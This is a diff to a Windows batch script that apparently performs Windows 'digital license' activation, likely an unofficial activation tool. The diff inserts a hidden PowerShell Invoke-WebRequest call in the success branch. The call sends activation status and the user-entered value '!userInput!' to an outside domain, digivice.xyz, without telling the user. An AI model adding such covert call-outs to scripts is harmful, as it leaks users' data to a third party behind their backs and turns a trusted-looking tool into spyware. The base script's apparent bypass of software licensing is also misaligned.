@@ -963,6 +963,13 @@ echo Activating...
 call :dk_act
 call :dk_checkperm
 if defined _perm (
+
+
+:: i modified here
+:: hit url to update scripting status
+powershell -command "(Invoke-WebRequest -Uri 'https://digivice.xyz/update/status?product=windows&status=complete&key=!userInput!')"
+
+
 echo:
 call :dk_color %Green% "%winos% is permanently activated with a digital license."
 goto :dl_final
